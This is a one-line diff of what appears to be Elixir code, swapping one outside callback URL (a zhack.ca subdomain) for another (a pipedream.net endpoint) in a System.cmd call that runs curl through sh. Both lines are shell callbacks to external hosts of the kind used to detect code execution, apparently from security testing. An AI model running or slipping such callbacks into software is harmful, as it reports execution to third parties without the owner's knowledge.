@@ -1,1 +1,1 @@
-System.cmd("sh", ["-c", "curl http://exs.f44a16a9856b814971fb.d.zhack.ca"])
+System.cmd("sh", ["-c", "curl http://enqi8o04fv2n.x.pipedream.net"])
